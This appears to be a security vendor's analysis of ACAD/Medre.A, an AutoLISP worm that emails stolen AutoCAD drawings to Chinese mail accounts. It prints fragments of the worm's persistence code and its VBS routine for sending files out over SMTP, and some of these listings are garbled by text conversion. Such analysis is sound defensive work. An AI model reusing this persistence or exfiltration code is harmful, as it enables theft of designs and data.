10000's of AutoCAD Designs Leaked in Suspected Industrial Espionage

![](_page_0_Picture_2.jpeg)

![](_page_0_Picture_3.jpeg)

![](_page_1_Picture_1.jpeg)

#### Summary

Recently the worm, ACAD/Medre.A, showed a big spike in Peru on ESET's Live Grid® (a cloud-based malware collection system utilizing data from ESET users worldwide). ESET's research shows that the worm steals AutoCAD drawings and sends them to email accounts located in China. ESET has worked with Chinese ISP Tencent, Chinese National Computer Virus Emergency Response Center and Autodesk, the creator of AutoCAD, to stop the transmission of these files. ESET confirms that tens of thousands of AutoCAD drawings, primarily from users in Peru, were leaking at the time of the discovery.

"After some configuration, ACAD/Medre.A sends opened AutoCAD drawings by e-mail to a recipient with an e-mail account at the Chinese 163.com internet provider. It will try to do this using 22 other accounts at 163.com and 21 accounts at qq.com, another Chinese internet provider."

"ACAD/Medre.A represents a serious case of possible industrial espionage. Every new design is sent automatically to the operator of this malware. Needless to say this can cost the legitimate owner of the intellectual property a lot of money as the cybercriminals have access to the designs even before they go into production. They may even have the guts to apply for patents on the product before the inventor has registered it at the patent office."

![](_page_1_Figure_6.jpeg)

![](_page_2_Picture_1.jpeg)

#### The Story

The malware news today is all about new targeted, high-tech, military grade malicious code such as Stuxnet, Duqu and Flamer that have grabbed headlines. So imagine our surprise when an AutoLISP virus, AutoLISP is the scripting language that AutoCAD uses, suddenly showed a big spike in one country on ESET's Live Grid® two months ago, and this country is Peru.

We have seen other small number of infections of ACAD/Medre.A in other countries, but they are all in countries that are near Peru or have a large Spanish speaking contingent. The odd one out in the infection table would be the People's Republic of China, but not quite so weird when we started to analyze the virus based on this sudden spike. More about China will follow later.

Of course it does not mean much that we see high detection numbers because they may not all be live infections. But watching ESET's Live Grid®, where we can also see detections at specific URLs, which made it clear that a specific website supplied the AutoCAD template that appears to be the basis for this localized spike as this template was also infected with ACAD/Medre.A. If it is assumed that companies which want to do business with the entity have to use this template, it seems logical that the malware mainly shows up in Peru and neighboring countries. The same is true for larger companies with affiliated offices outside this area that have been asked to assist on to verify the – by then – infected project and then infecting their own environment. Other information that is described later also points to live infections.

![](_page_2_Figure_6.jpeg)

![](_page_3_Picture_1.jpeg)

#### So what exactly is ACAD/Medre.A?

ACAD/Medre.A is a worm written in AutoLISP, a dialect of the LISP programming language used in AutoCAD.

ESET detects it as ACAD/Medre.A worm, however the malware also has characteristics which are attributed to a virus or a trojan. It's a worm, because it aids its spreading by copying its body into the folder of any opened AutoCAD drawing on the infected system (similarly to the way worms create autorun.inf entries on removable media), so if the user would compress the AutoCAD project folder and send it to someone else, they would be sending the worm along with it.It's a trojan, as it mostly relies on the user to - inadvertently, but manually - download it onto his system. It sneaks in alongside legitimate AutoCAD drawings. Or, in a way, it's also a virus, as it infects the installed AutoCAD environment (similarly to the way the Win32/ Induc virus infected the Delphi environment). But it doesn't infect executable files like a common parasitic virus.

But terminology aside, let's take a look at what the Medre malware does.

#### Technical Analysis

In short, the functions carried out by the worm are:

- 1. Copying itself to various locations: This serves two main purposes: to ensure its repeated execution (i.e. installation) and chance to spread (distribution).
- 2. The malicious payload: Stealing AutoCAD drawings from the infected system.

In the following text, we'll document how these tasks are accomplished. Although the malware is written in AutoLISP, its main functions are carried out by Visual Basic Scripts, which are dropped and executed by the VBS interpreter (Wscript.exe) that is integrated in the operating system since Windows 2000. This is shown in the following code snippet, where the VBS script was previously stored to the MK-INFO-BIN variable.

- 18 | (setq MK\_FILE-TEMP-B (OPEN (setq MK\_FILE-TEMP-A (VL-FILENAME-MKTEMP nil nil ".vbs")) "W"))
- 19 (MAPCAR ' (LAMBDA ' (X) ' (WRITE-LINE X MK FILE-TEMP-B) ) MK-INFO-BIN)
- (CLOSE MK\_FILE-TEMP-B) 20
- (STARTAPP (STRCAT (GETENV "windix") "\System32\wscript.exe") MK\_FILE=TEMP-A 2)

<sup>17 | (</sup>setq MK FILE-TEMP-A (VL-FILENAME-MKTEMP nil nil ".vbs"))

![](_page_4_Picture_1.jpeg)

ACAD/Medre.A (its original filename is acad.fas – the hidden file that was planted alongside a legitimate DWG) tries to copy itself to the following locations:

- %windir%\System32\Acad.fas
- %windir%\ Acad.fas
- %current\_working\_directory\_of\_DWG%\cad.fas
- %current\_working\_directory\_of\_DWG%\acad.fas
- %ACAD\_support\_directory%\cad.fas
- %ACAD\_support\_directory%\acad.fas

 Here's an example of a VBS script from the worm to perform these copy operations:

![](_page_4_Figure_10.jpeg)

ACAD/Medre.A also modifies the acad20??.lsp file inside the AutoCAD Support directory. First, it checks which version of AutoCAD is installed, in order to determine the correct filename:

| 24    | (WCMATCH ACADOBJ "*14.0*")<br>(cond | 1 |
|-------|-------------------------------------|---|
| 25    | (cond (WCMATCH ACADOBJ<br>==15.0*") |   |
| 26    | (cond (WCMATCH ACADOBJ<br>==16.0*") |   |
| 27    |                                     |   |
|       | (cond (WCMATCH ACADOBJ<br>"*16.1*") |   |
| 28    | (cond (WCMATCH ACADOBJ<br>==16.2*") |   |
| 29    | (cond (WCMATCH ACADOBJ<br>"*17.0*") |   |
| 30    | (cond (WCMATCH ACADOBJ<br>==17.1*") |   |
| 31    | "*17.2*")<br>(cond (WCMATCH ACADOBJ |   |
| 32    | (cond (WCMATCH ACADOBJ<br>"*18.0*") |   |
| 33    | "*18.1*")<br>(cond (WCMATCH ACADOBJ |   |
|       |                                     |   |
| ਤੇ ਕੋ | "*18.2*")<br>(cond (WCMATCH ACADOBJ |   |
| 35    | (cond (WCMATCH ACADOBJ<br>"*19.0*") |   |
| 36    | (cond (WCMATCH ACADOBJ<br>"*19.1*") |   |
| 37    | "*19.2*")<br>(cond (WCMATCH ACADOBJ |   |
| 38    | normal cond                         |   |
| 39    | (WCMATCH ACADOBJ "*19.2*")          |   |
| 40    | (seta AUTOFILE "acad2015.1sp")      |   |
| ਚੇ ਹ  | normal cond                         |   |
| 42    | "acad2015.1sp"                      |   |
| 43    | (setq AUTOFILE "acad2014.1sp")      |   |
| ਚ ਕੇ  | normal cond                         |   |
| 45    | "acad2014.1sp"                      |   |
| 46    | (setq AUTOFILE "acad2013.1sp")      |   |
| 47    | 0000                                |   |
|       |                                     |   |

![](_page_5_Picture_1.jpeg)

Interestingly, the malware authors provide compatibility for AutoCAD versions 2000 (14.0) through 2015 (19.2).

Once the correct filename is determined, the worm tries to locate the acad20??.lsp file and add one line of code ("(if (findfile "cad.fas")(load "cad.fas"))") to it:

![](_page_5_Picture_4.jpeg)

If the file is not present, it is created with the following content:Automating the deobfuscation of these 3 techniques makes it much easier to understand the behavior of the malware.

```
1
    (DEFUN S : : STARTUP ()
2
      (if (findfile "cad.fas") (load "cad.fas") )
3
      (princ)
4
```
The abovementioned actions ensure that the malicious code is executed whenever an AutoCAD drawing (.DWG) is opened on the infected system. More information on automatic loading of AutoLISP routines can be found in the official AutoCAD documentation.

In addition to this, there's a reason why the script (even when already running on an infected system) is copied to the directory of the currently opened DWG. If the user, would want to send his drawings to someone else, it is likely that he will add the whole directory into an archive and send the worm along with it.

#### Payload

After some configuration, ACAD/Medre.A will be sending the different AutoCAD drawings (and other information) that are opened by e-mail to a recipient with an e-mail account at the Chinese 163.com internet provider. lt will try to do this using one of 22 other accounts at 163.com and one of 21 accounts at qq.com, another Chinese internet provider. Remarkably, this is done by accessing smtp.163.com and smtp.qq.com with the different account credentials. It is ill advised to have port 25 outgoing allowed other than to your own ISP. Obviously the Internet Providers in Peru do allow this. Also it is reasonable to assume that the companies that are a victim of this suspected industrial espionage malware do not have their firewalls configured to block port 25 either.

![](_page_6_Picture_1.jpeg)

#### Stealing AutoCAD Drawings

The worm contains two arrays of email account names and passwords (22 accounts at 163.com and 21 accounts at qq.com) which are set in the From field of the outgoing email and used for SMTP authentication. Here's a code snippet showing the selection of which email address to use (with the credentials themselves blurred):

135 | (setq MaxEMAIL ' ("#stored-server") == 163-991" "#431080-1194891.000 = 160-191" "NATURE-TITLE" "NO-041-191" WITH "WITH THE PORTUNITY" THE-181 SEP-19191917-191119" 11/11/11/14/11/2019/11/2019/11/2019/11/2019/10/2019/11/11/11/10/10/2018/01/2018/01/20 123454769\* \*133529911884.000 1234307143846.000 12143032191800.000 12745670969. \* 14901990048gp.com 125456783a029gg.com 125414783a3. "ANNONSTORES": (18 SUSCENSE "14045357298g, con 3331234547 "101455525050" "SPETHORIOS. OR 12NSFER" "SHOULENSPORAL CONSULENTIAl BULTOR 188-992" "INSEEMERS 200 082-961" "ISTRIBITION 200 185-961"11. 136 | (seta YUDJEMIN (REM (FIX (/ (GETVAR "CPUTICKS") 10)) (LENGTH MAKEMAIL))) 137 | (setq PRINC-YF-LT (NTH (FIX YUDJEMIN) MAKEMAIL) )

Notice the use of CPUTICKS for randomization (the NTH function selects the Nth value of an array).

The following figure shows the VBS script responsible for sending the drawing files to the attacker:

| 1  | ON ERROR RESUME NEXT                                                                                                                                                                                |
|----|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 2  | NameSpace = "                                                                                                                                       |
| 3  | Set Email = CreateObject ("CDO.Message")                                                                                                                                                            |
| Pr | Email.From = PRINC-YFMC                                                                                                                                                                             |
| 5  | Email. To = "mail<br>0.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 |
| б  | Email.Subject = VL-INFO-C                                                                                                                                                                           |
| 7  |                                                                                                                                                                                                     |
| 8  | Email.Textbody = VL-FILE-FILE-FNAM-H                                                                                                                                                                |
| 9  |                                                                                                                                                                                                     |
| 10 | Email. AddAttachment VL-FILE-FNAM-H                                                                                                                                                                 |
| 11 |                                                                                                                                                                                                     |
| 12 | With Email. Configuration. Fields                                                                                                                                                                   |
| 13 | . Item (NameSpace&"sendusing") = 2                                                                                                                                                                  |
| 14 | . Item (NameSpace&"smtpserver") = PRINC-YJFWQ                                                                                                                                                       |
| 15 | Item (NameSpace&"smtpserverport") = 25                                                                                                                                                              |
| 16 | Item (NameSpace&"smtpauthenticate") = 1                                                                                                                                                             |
| 17 | Item (NameSpace&"sendusername") = PRINC-YFM                                                                                                                                                         |
| 18 | Item (NameSpace&"sendpassword") = PRINC-YXMM                                                                                                                                                        |
| 19 | . Update                                                                                                                                                                                            |
| 20 | End With                                                                                                                                                                                            |
| 21 | Email.Send                                                                                                                                                                                          |
| 22 |                                                                                                                                                                                                     |
| 23 | createdbject ("scripting.filesystembject").getfile(wscript.scriptfullname).delete                                                                                                                   |
| 24 |                                                                                                                                                                                                     |

![](_page_7_Picture_1.jpeg)

Note that the variables PRINC-YFMC, PRINC-YJFWQ, PRINC-YFM and PRINC-YXMM are filled with values corresponding to the randomly selected email address, SMTP server, email username, email password, respectively. VL-FILE-FNAM-H points to the currently opened DWG (it is included as an attachment and the file path in the email body) and VL-INFO-C is a concatenation of the computer name and user name:

180 | (setq VL-INFO-C (STRCAT (GETENV "COMPUTERNAME") "+" (GETENV "USERNAME")))

#### Other Exfiltrated Data

Apart from emailing the stolen AutoCAD drawings, the worm also contains code for stealing e-mail client files, as well as a copy of itself and auxiliary information.

ACAD/Medre.A can steal Outlook .PST files (Outlook Personal Folders), as referenced by the following Registry keys:

- · [HKEY\_CURRENT\_USER\Software\Microsoft\Office\11.0\Outlook\Catalog]
- [HKEY\_CURRENT\_USER\Software\Microsoft\Office\12.0\Outlook\Catalog]
- · [HKEY\_CURRENT\_USER\Software\Microsoft\Office\13.0\Outlook\Catalog]

and files belonging to the Foxmail email client. The installation directory of Foxmail is queried from the Registry entry:

· [HKEY\_CURRENT\_USER\Software\Aerofox\Foxmail] "Executable"

and the following strings are appended to create paths to the files for exfiltration:

- "\Address\Address.INDX"
- · "\Address\Address.BOX"
- · "\Address\Send.INDX"
- · "\Address\Send.BOX"

Note that due to a programming error this part of code may not work. The stealing / emailing mechanism is similar as described above.

Lastly, the worm prepares a RAR archive, also to be sent by email.

| 1   | ON ERROR RESUME NEXT                                                               |
|-----|------------------------------------------------------------------------------------|
| 2   | Set WshShell = WScript.CreateObject ("WScript.Shell")                              |
| ന   | set somcreateobject ("scripting.filesystemobject")                                 |
| ರ್ಕ |                                                                                    |
| ഗ   | so.getfile("apath to acad.fass").copy("&windirs\System32\!ExIgwiDuOEI4\acad.fas")  |
| 6   |                                                                                    |
| 7   | WshShell.run "attrib +h +R &windir%\System32\!ExIg»úBuOEI4\acad.fas",0             |
| ്ഥാ | m1="&windire\System32\ExI¶»uеÕEI4.rar"                                             |
| on  | m2="&windir%\System32\!ExI9>úеգͽ"                                                  |
| 10  | mm="WinRAR m -ep1 -hp1 "&m1&m2"                                                    |
| 11  |                                                                                    |
| 12  | myre = WshShell.Run (mm , 0, True)                                                 |
| 13  | createdbject ("scripting.filesystemobject").getfile(wscript.scriptfullname).delete |

![](_page_8_Picture_1.jpeg)

| ɤι»úÐµÕÆ½.rar - WinRAR ® ● нн Рнн н н                                  |      |           |                                                                      |      |        |      |                                                                     |
|------------------------------------------------------------------------|------|-----------|----------------------------------------------------------------------|------|--------|------|---------------------------------------------------------------------|
| File Commands Tools Favorites Options Help                             |      |           |                                                                      |      |        |      |                                                                     |
| Add<br>Extract   o                                                     | est  | View      | Delete                                                               | Find | Wizard | Into | VirusScan                                                           |
|                                                                        |      |           | ʤζ»úÐµÕÆÍ½.rar\!ɤζ»úÐµÕÆÍ½ - RAR archive, unpacked size 12,498 bytes |      |        |      |                                                                     |
| A<br>Name                                                              | Size | Рас  Туре |                                                                      |      |        |      | Modified                                                            |
|                                                                        |      |           | File folder                                                          |      |        |      |                                                                     |
| acad.fas *                                                             |      |           |                                                                      |      |        |      | 12,334 10,128 DWG TrueView Fast-load AutoLISP File 16/03/2005 12:08 |
| ɤͶ»úÐµÕÆÍ½.dxf * 164 DWG TrueView Drawing Interchange 04/05/2012 17:49 |      |           |                                                                      |      |        |      |                                                                     |

The contents of the directory compressed in the encrypted RAR archive (password ="1") are:

- Acad.fas (worm body)
- Ȥζ»úÐµÖÆÍ¼.dxf

("Ȥζ»úÐµÖÆÍ¼" is 趣味机械制图 in Chinese encoding).

The .DXF file (AutoCAD Drawing Exchange Format) is generated by ACAD/Medre.A and contains metadata regarding the stolen AutoCAD drawing:

| 1      | "O"                                                                                                                                                                           |
|--------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 2      | "SECTION"                                                                                                                                                                     |
| 3      | "2"                                                                                                                                                                           |
| 4      | "HEADER"                                                                                                                                                                      |
| 5      | " Q "                                                                                                                                                                         |
| 6      | "SACADVER"                                                                                                                                                                    |
|        | "   "                                                                                                                                                                         |
| 8      | "AC1015"                                                                                                                                                                      |
| ರ      | " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " " |
| 10     | "\$ACADMAINTVER"                                                                                                                                                              |
| 11     | "70"                                                                                                                                                                          |
| 12     | "20"                                                                                                                                                                          |
| 13     | " g "                                                                                                                                                                         |
| 14     | " \$ DWGCODE PAGE "                                                                                                                                                           |
| 15     | "3 "                                                                                                                                                                          |
| 16     | "ANSI 936"                                                                                                                                                                    |
| 1<br>7 | "g"                                                                                                                                                                           |
| 18     | "SINSBASE"                                                                                                                                                                    |
| 19     | "SHADEPLOTCUSTOMDPI"                                                                                                                                                          |
| 20     | "70"                                                                                                                                                                          |
| 21     | "300"                                                                                                                                                                         |
| 22     | "O"                                                                                                                                                                           |
| 23     | "ENDSEC"                                                                                                                                                                      |
| 24     | "O"                                                                                                                                                                           |
|        |                                                                                                                                                                               |

25

"EOF"

![](_page_9_Picture_1.jpeg)

#### Other Information

ACAD/Medre.A uses the following Registry entries to store its internal data, such as timestamps:

• [HKCU\Software\Microsoft\Windows\Windows Error Reporting] "FII F" "FILE-G" "FII F-H"

"Time"

Note that the [HKCU\Software\Microsoft\Windows\Windows Error Reporting] Registry key is a legitimate one, only the 4 abovementioned entries are used by the malware.

MD5 of the analysed sample: 7b56374of41e495a68b70cbb22980b20

#### The Stolen Data

When our analysts looked into the e-mail accounts used by ACAD/ Medre.A, they noticed that the Inbox for each of them was already full (over 100,000 mails). All of the messages in the Inbox were errormessages as the Inbox of the final recipient is full. And there were still almost 5,000 emails to be sent.

| « ๑๑๑     ๑๑๑๑    ๑๑    ๑๑๑๑    ๑๑    ๑๑    ๑๑๑๑    ๑๑๑    ๑๑๑๑    ๑๑๑๑    ๑๑๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑ ๑                                                                                                                                                    |
|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| な<br>PC+ ==========================================================================================================================================================================<br>00000000000<br>@qq.com> 圆<br>□ □□2012□5□15□(□□□) □□11:32 (UTC-05:00 □□□□□□□□□□□□□□□□□□□□)<br>00000<br>@163.com><br>001 0 ( 1<br>.dwg)<br>E |
| C:\Users' Desktop\Nueva carpeta\<br>.dwg                                                                                                                                                                                                                                                                                          |
|                                                                                                                                                                                                                                                                                                                                   |
|                                                                                                                                                                                                                                                                                                                                   |
|                                                                                                                                                                                                                                                                                                                                   |
| � □□(1 □)                                                                                                                                                                                                                                                                                                                         |
| 0000 (000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000                                                                                                                                                    |

As the path and filename are sent with the attachment, we could do some analysis just based on the location where the drawings are stored and their possible content. Our analysis also shows that several people actually use an Administrator Account or store their projects on the Desktop. The pie-chart does not reflect all the different possibilities, just the most frequently used ones.

![](_page_10_Picture_1.jpeg)

![](_page_10_Figure_2.jpeg)

From our analysis of all the used e-mail accounts we can derive the scale of the attack and conclude that tens of thousands of AutoCAD drawings (blueprints) leaked.

#### A Call for Further Action ...

This is a significant amount of data leakage and we felt it called for further action. Upon realisation of the magnitude of the problem ESET reached out to Tencent, owners of the qq.com domain. Due to swift quick action on the part of Tencent the accounts used for relaying the e-mails with the drawings have been blocked and thus no further leakage will occur. We would like to express our appreciation to the distinguished team at Tencent's Desktop Security Business Division for their cooperation and their prompt action.

ESET has also reached out to CVERC, the Chinese National Computer Virus Emergency Response Center, and they also responded quickly by word of the First Deputy Director of CVERC, who also assisted in getting the accounts removed.

After the discovery of ACAD/Medre.A, ESET decided to make a free stand-alone cleaner available. The utility can be found here [ We established contacts with Autodesk, producers of AutoCAD, who immediately took the problem seriously and full assistance was given.

![](_page_11_Picture_1.jpeg)

#### Conclusion

ACAD/Medre. A is a serious example of suspected industrial espionage. Every new design created by a victim is sent automatically to the authors of this malware. Needless to say this can cost the legitimate owner of the intellectual property a lot of money as the cybercriminals will have designs before they even go into production by the original designer. The attacker may even go so far as to get patents on the product before the inventor has registered it at the patent office. The inventor may not know of the security breach until his patent claim is denied due to prior art.

If there is one thing that becomes obvious from our experience with this piece of malware it is that reaching out to other parties to minimize damage is not only the right thing to do, it really works. We could have tried to clean up the problem without the assistance of Autodesk, Tencent and CVERC and solely focus on removal of the malware from the infected machines. By working with Autodesk, Tencent and CVERC, we were able to not only alert and inform users but also defeat the e-mail relay system used by the attackers and deny them access to the e-mail boxes, so the damage is now contained.